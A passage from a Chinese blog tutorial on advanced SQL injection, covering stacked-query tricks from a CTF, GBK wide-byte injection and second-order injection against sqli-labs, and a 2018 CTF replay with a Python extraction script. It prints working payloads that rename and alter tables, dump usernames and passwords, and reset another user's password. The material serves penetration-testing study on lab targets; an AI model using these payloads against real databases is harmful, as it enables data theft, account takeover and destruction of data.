<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128154554855.png" alt="image-20210128154554855"></p>
<p>使用order尝试字段数量猜解；</p>
<p><code>1&#39; order by 2#</code>返回正常</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161307478.png" alt="image-20210128161307478"></p>
<p><code>1&#39; order by 3#</code>返回错误，判断字段数量为2</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161402835.png" alt="image-20210128161402835"></p>
<p>尝试使用<code>union select</code>语句注入出库名;</p>
<p><code>1&#39; union select 1,database()#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161507494.png" alt="image-20210128161507494"></p>
<p>根据返回信息发现存在过滤，常用敏感字符均被过滤；但是没有过滤分号，尝试使用堆叠注入获取表名;</p>
<p><code>1&#39;;show tables;#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128161756298.png" alt="image-20210128161756298"></p>
<p>尝试获取words表中的字段；<code>1&#39;;show columns from words;#</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128162804831.png" alt="image-20210128162804831"></p>
<p>尝试获取<code>1919810931114514</code>表中的字段；</p>
<p><code>1&#39;;show columns from ``1919810931114514``;#</code>注：若表名为纯数字时，查询字段需要将表名用反引号包裹起来</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128164413693.png" alt="image-20210128164413693"></p>
<p>目前已经获取到了表中<code>flag</code>的字段名，怎么获取字段内容是关键点；</p>
<p>解法一：使用<code>rename</code>把<code>words</code>表更名为其他的表名；在把表<code>1919810931114514</code>改成<code>words</code>;给新<code>words</code>表添加新的列名<code>id</code>;将<code>flag</code>改名为<code>data</code>;</p>
<p><code>payload1</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0&#x27;;rename table words to words1;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc  words;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180359265.png" alt="image-20210128180359265"></p>
<p><code>payload12</code>:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180506380.png" alt="image-20210128180506380"></p>
<p>解法二：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">将select * from ` 1919810931114514 `进行16进制编码；</span><br><span class="line">在构造payload：</span><br><span class="line">1&#x27;;SeT@a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;#</span><br></pre></td></tr></table></figure>

<ul>
<li><code>prepare…from…</code>是预处理语句，会进行编码转换。</li>
<li><code>execute</code>用来执行由<code>SQLPrepare</code>创建的<code>SQL</code>语句。</li>
<li><code>SELECT</code>可以在一条语句里对多个变量同时赋值,而<code>SET</code>只能一次对一个变量赋值。</li>
</ul>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png" alt="image-20210128180652574"></p>
<p>解法三：</p>
<p><code>payload:</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128180652574.png" alt="image-20210128180652574"></p>
<h1 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h1><h2 id="宽字节注入的概念"><a href="#宽字节注入的概念" class="headerlink" title="宽字节注入的概念"></a>宽字节注入的概念</h2><p>• 宽字节是相对于<code>ascii</code>这样的单字节而言的；像<code>GB2312、GBK、GB18030、BIG5、Shift_IIS</code>等这些都是常说的宽字节，实际上只有两个字节</p>
<p>• <code>GBK</code>是一种多字符编码，通常来说，一个<code>gbk</code>编码汉字、占用2个字节。一个<code>utf-8</code>编码的汉字，占用3个字节</p>
<h2 id="宽字节注入的原理"><a href="#宽字节注入的原理" class="headerlink" title="宽字节注入的原理"></a>宽字节注入的原理</h2><p><code>GBK</code> 占用两字节，<code>ASCII</code>占用一字节</p>
<p><code>PHP</code>中编码为<code>GBK</code>，函数执行添加的是<code>ASCII</code>编码（添加的符号为“\”），<code>MYSQL</code>默认字符集是<code>GBK</code>等宽字节字符集。</p>
<p>大家都知道<code>%df&#39;</code>被<code>PHP</code>转义（开启<code>GPC</code>、用a<code>ddslashes</code>函数，或者<code>icov</code>等），单引号被加上反斜杠<code>\</code>，变成了 <code>%df\&#39;</code>，其中<code>\</code>的十六进制是<code> %5C</code> ，那么现在 <code>%df\’ =%df%5c%27</code>，如果程序的默认字符集是<code>GBK</code>等宽字节字符集，则<code>MySQL</code>用<code>GBK</code>的编码时，会认为<code>%df%5c </code>是一个宽字符，也就是縗，也就是说：<code>%df\’ = %df%5c%27=縗’</code>，有了单引号就好注入了。</p>
<h2 id="宽字节注入前提条件"><a href="#宽字节注入前提条件" class="headerlink" title="宽字节注入前提条件"></a>宽字节注入前提条件</h2><p>简单理解:</p>
<p>数据库编码与<code>PHP</code>编码设置为不同的两个编码那么就有可能产生宽字节注入</p>
<p>深入讲解：</p>
<p>要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析<code>SQL</code>语句，其次还要保证在该种字符集范围中包含低字节位是 <code>0x5C(01011100) </code>的字符，初步的测试结果 <code>Big5 </code>和<code> GBK</code> 字符集都是有的， <code>UTF-8</code> 和 <code>GB2312</code> 没有这种字符（也就不存在宽字节注入）。</p>
<h2 id="宽字节注入的利用-sqlilab-less38"><a href="#宽字节注入的利用-sqlilab-less38" class="headerlink" title="宽字节注入的利用(sqlilab-less38)"></a>宽字节注入的利用(sqlilab-less38)</h2><p>测试页面存在注入点</p>
<p>首先我们用常规测试方法带入单引号，判断当前页面是否存在注入。如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150312508.png" alt="image-20210128150312508"></p>
<p>通过图片我们发现当前页面数据回显结果是正常的，下面提示信息我们看到，原来我们带入的单引号被增加一反斜杠转义了，所以导致我们的单引号带入失效。这边我们可以联想到源码中可能用了<code>addslashes</code>函数等我们带入的特殊字符进行了转义。</p>
<p>查看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_addslashes</span>(<span class="params"><span class="variable">$string</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$string</span> = addslashes(<span class="variable">$string</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=check_addslashes(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="comment">//echo &quot;The filtered request is :&quot; .$id . &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line">mysql_query(<span class="string">&quot;SET NAMES gbk&quot;</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>

<p>通过源码我们看到mysql设置了gbk的编码方式，这边我们想到宽字节注入。</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=1%df&#39;</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150415389.png" alt="image-20210128150415389"></p>
<p>我们发现此时页面报错，这是<code>php</code>使用<code>addslashes</code>函数将<code>%df&#39;</code>中的单引号转义，形成<code>%df\&#39;</code>。<code>mysql</code>的<code>gbk</code>编码把<code>%df\</code>认为是一个汉字，此时单引号就成功逃逸出来，产生了注入。后面使用常见的联合注入即可。</p>
<p>猜解数据名</p>
<p>首先使用order by函数判断当前库的字段数量</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; order by 4--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150542009.png" alt="image-20210128150542009"></p>
<p>带入参数4时，数据库报错。判断当前字段数量为4</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,database(),3--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150618966.png" alt="image-20210128150618966"></p>
<p>获取到当前数据库的名称为security</p>
<p>猜解库中的表名</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150640389.png" alt="image-20210128150640389"></p>
<p>获取当前库下的表名为<code>emails,referers,uagents,users</code></p>
<p>猜解users表中的字段名</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x27736563757269747927 and table_name=0x27757365727327--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150840816.png" alt="image-20210128150840816"></p>
<p>获取字段内容</p>
<p><code>http://192.168.31.220:8080/Less-32/?id=-1%df&#39; union select 1,group_concat(username,password),3 from users--+</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128150906850.png" alt="image-20210128150906850"></p>
<h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="注入和二次注入的区别"><a href="#注入和二次注入的区别" class="headerlink" title="注入和二次注入的区别"></a>注入和二次注入的区别</h2><p><code>sql</code>注入流程：</p>
<p>•      1.攻击者在注入点输入恶意<code>sql</code>语句，通过<code>http</code>请求提交；</p>
<p>•      2.服务器中的应用程序处理恶意的<code>sql</code>，并向攻击者返回注入结果；</p>
<p>二次注入流程：</p>
<p>•      1.攻击者在注入点提交恶意<code>sql</code>语句；</p>
<p>•      2.通过<code>http</code>请求，将恶意<code>sql</code>保存到应用程序的数据库中；</p>
<p>•      3.攻击者第二次提交<code>http</code>请求；</p>
<p>•      4.服务器处理第二次<code>http</code>请求，检索存储在数据库中的恶意<code>sql</code>，构造<code>sql</code>语句；</p>
<p>•      5.服务器向攻击者返回注入结果；</p>
<h2 id="二次注入的原理"><a href="#二次注入的原理" class="headerlink" title="二次注入的原理"></a>二次注入的原理</h2><p>数据首次插入到数据库中时，应用程序会以（ <code>addslashes</code> 或者是借助<code>get*magic*quotes_gpc</code> 对其中的特殊字符进行转义)安全的方式处理这些数据,但是，这些数据可能会被应用程序本身或者其他的后端进程会以危险的方式处理这些数据，从而造成了二次注入。</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151053028.png" alt="image-20210128151053028"></p>
<h2 id="二次注入的利用"><a href="#二次注入的利用" class="headerlink" title="二次注入的利用"></a>二次注入的利用</h2><p>判断注入点</p>
<p>在Less-24实验中，首页的登录界面进行相应的判断测试，测试判断是否存在注入点。但是不管怎么构造参数带入均发现页面如下情况，没有任何其他变化，所以判断此处无注入点。</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151119696.png" alt="image-20210128151119696"></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151124989.png" alt="image-20210128151124989"></p>
<p>源码分析</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">  <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">  <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"> <span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">  <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">  <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>通过代码分析发现，数据接收参数<code>login_user</code>和<code>login_password</code>都会经过函数<code>mysql_real_escape_string（）</code>处理字符串。</p>
<p>此函数的具体定义如下：</p>
<p><code>mysql_real_escape_string</code>函数转义<code>SQL</code>语句中使用的字符串中的特殊字符.</p>
<p>受影响字符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">\x00</span><br><span class="line"></span><br><span class="line">\n</span><br><span class="line"></span><br><span class="line">\r</span><br><span class="line"></span><br><span class="line">\</span><br><span class="line"></span><br><span class="line">&#x27;</span><br><span class="line"></span><br><span class="line">&quot;</span><br><span class="line"></span><br><span class="line">\x1a</span><br></pre></td></tr></table></figure>

<p>使用此函数后，基本上使用这个点注入不太可能。</p>
<p>首页的登录页不行，发现登录页下面还有两个功能。一个是忘记密码，你一个注册新用户。</p>
<p>这里我们首先注册一个<code>test</code>用户，密码为<code>111111</code>，然后使用此用户进行登录，登录后的页面如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151147487.png" alt="image-20210128151147487"></p>
<p>我们发现登录成功之后是一个用户的登录后台页，并且该页面支持当前用户的密码修改，修改密码的代码页名称为<code>pass_change.php</code>.</p>
<p>我们查看当前页面修改密码的源代码，并进行相应的分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line"> &#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    \<span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">           header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">           <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>通过源码我们可以看到<code>$username</code>是直接从<code>session</code>中读取的，并且没有进行参数的转义处理。<code>curr_pass</code>和<code>re_pass</code>经过了函数<code>mysql_real_escape_string</code>转义处理。因此我们可以直接控制<code>username</code>这个变量进行相关注入操作。</p>
<p>用户注册成功后，会将用户的基本信息写入到数据库中存储，如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151215700.png" alt="image-20210128151215700"></p>
<p>前面我们提到<code>mysql_real_escape_string</code>函数可以将字符串转义直接写入到数据库中存储。</p>
<p>并且由源码我们知道修改密码的<code>SQL</code>代码为：</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;$username&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p><code>username</code>变量是直接读取数据库的内容，并且没有经过转义。</p>
<p>这边的思路是，可以直接构造一个<code>test&#39;#</code>用户，新建此用户，再登录进行二次用户调用修改密码的时候，原<code>SQL</code>语句变为:</p>
<p><code>$sql = &quot;UPDATE users SET PASSWORD=&#39;$pass&#39; where username=&#39;test&#39;#&#39; and password=&#39;$curr_pass&#39; &quot;;</code></p>
<p>由于#号注释掉了后面的语句，所以，我们本来修改的<code>test&#39;#</code>的密码，但实际上修改了<code>test</code>的密码，而且<code>test&#39;#</code>当前密码可以任意输入。</p>
<p>创建<code>test&#39;#</code>用户</p>
<p>用户名<code>test&#39;#</code> 密码<code>88888</code> 创建完成后，正常登陆</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151235080.png" alt="image-20210128151235080"></p>
<p>查看数据，发现用户<code>test&#39;#</code>已被成功写入数据库，如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151249140.png" alt="image-20210128151249140"></p>
<p>修改当前用户密码</p>
<p>修改当前用户新密码为<code>66666</code>，并且用户的当前密码为<code>888888</code>，此处可以输入任意的密码为<code>222222</code>，可以正常修改密码，如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151303856.png" alt="image-20210128151303856"></p>
<p>查看数据库，发现<code>test</code>用户被正常修改，如下图所示：</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128151316265.png" alt="image-20210128151316265"></p>
<p>由此就是整个二次注入的利用过程，这边我门只要相应的构造管理员的用户名就可以任意修改管理员账户的用户名和密码。</p>
<h2 id="真题环境复现-网鼎杯2018-Unfinish"><a href="#真题环境复现-网鼎杯2018-Unfinish" class="headerlink" title="真题环境复现(网鼎杯2018-Unfinish)"></a>真题环境复现(网鼎杯2018-Unfinish)</h2><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>使用buu平台复现</p>
<p><code>网鼎杯2018-Unfinish</code></p>
<h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先请求发现是一个登录页，使用几个常用用户名和密码尝试登录，没有任何信息；</p>
<p>使用web扫描器，发现存在<code>register.php</code>注册功能页面，尝试注册一个用户并登录；</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193107498.png" alt="image-20210128193107498"></p>
<p>登录成功后，我们可以在登录成功页发现登录用户的用户名；</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210128193219077.png" alt="image-20210128193219077"></p>
<p>那么这种题型我们能想到就是二次注入的可能性最大；</p>
<p>并且注册时有个特点，就是注册成功会得到302的状态码并跳转至<code>login.php</code>；如果注册失败，只会返回200的状态码；</p>
<p>并且里面有一定的字符串过滤,简单测试，大概过滤了<code>逗号，information_schema</code>等字符；</p>
<p>一般过滤了<code>information_schema</code>字符的话，就很少可能在再能直接拆解库表字段名，所以这里猜测是flag;</p>
<p>payload:<code>0&#39;%2bascii(substr(database() from 1 for 1))%2b&#39;0</code>；注册后成功获取到库名第一个首字母的<code>ascii</code>值；</p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129133636903.png" alt="image-20210129133636903"></p>
<p>构造获取<code>flag</code>的<code>payload</code>;<code>0&#39;%2bascii(substr((select * from flag) from 1 for 1))%2b&#39;0</code></p>
<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129134724322.png" alt="image-20210129134724322"></p>
<p>按照此方法以依次猜解flag的字段内容即可，这里直接上脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/env pyton3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_url = <span class="string">&#x27;http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/register.php&#x27;</span></span><br><span class="line">login_url = <span class="string">&#x27;http://34de0eee-d1e3-42cd-a1cd-5127e8032f8f.node3.buuoj.cn/login.php&#x27;</span></span><br><span class="line"></span><br><span class="line">email = <span class="string">&quot;admin&#123;&#125;@qq.com&quot;</span></span><br><span class="line">payload = <span class="string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	data = &#123;</span><br><span class="line">		<span class="string">&#x27;email&#x27;</span>: email.<span class="built_in">format</span>(i), </span><br><span class="line">		<span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(i),</span><br><span class="line">		<span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">#print(data)</span></span><br><span class="line">	r1 = requests.post(url = register_url, data = data)</span><br><span class="line">	r2 = requests.post(url = login_url, data = &#123;<span class="string">&#x27;email&#x27;</span>: email.<span class="built_in">format</span>(i), <span class="string">&#x27;password&#x27;</span>: <span class="string">&quot;admin&quot;</span>&#125;)</span><br><span class="line">	<span class="comment">#print(r2.text)</span></span><br><span class="line">	pattern = <span class="string">r&#x27;&lt;span class=\&quot;user-name\&quot;&gt;\s*(\d&#123;1,10&#125;)\s*&lt;&#x27;</span></span><br><span class="line">	flag_str = re.findall(pattern,r2.text)[<span class="number">0</span>]</span><br><span class="line">	sys.stdout.write(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag_str)))</span><br><span class="line">	sys.stdout.flush()</span><br></pre></td></tr></table></figure>

<p><img src="https://gitee.com/greetdawn/blogImages/raw/master/img/image-20210129143131058.png" alt="image-20210129143131058"></p>
</div><div class="article-licensing box"><div class="licensing-title"><p>SQL注入中的点点滴滴</p><p><a href="http://www.greetdawn.top/2021/02/01/渗透测试/sql-injection/sql-injection-advanced/">http://www.greetdawn.top/2021/02/01/渗透测试/sql-injection/sql-injection-advanced/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>作者</h6><p>丨greetdawn丨</p></div></div><div class="level-item is-narrow"><div><h6>发布于</h6><p>2021-02-01</p></div></div><div class="level-item is-narrow"><div><h6>更新于</h6><p>2021-02-01</p></div></div><div class="level-item is-narrow"><div><h6>许可协议</h6><p><a class="icons" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="icon fab fa-creative-commons"></i></a><a class="icons" rel="noopener" target="_blank" title="Attribution" href="https://creativecommons.org/licenses/by/4.0/"><i class="icon fab fa-creative-commons-by"></i></a><a class="icons" rel="noopener" target="_blank" title="Noncommercial" href="https://creativecommons.org/licenses/by-nc/4.0/"><i class="icon fab fa-creative-commons-nc"></i></a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/sql-injection/">sql-injection</a></div><div class="sharethis-inline-share-buttons"></div><script src="https://platform-api.sharethis.com/js/sharethis.js#property=62189432b846610019d3dc50&amp;product=inline-share-buttons" defer></script></article></div><div class="card"><div class="card-content"><h3 class="menu-label has-text-centered">喜欢这篇文章？打赏一下作者吧</h3><div class="buttons 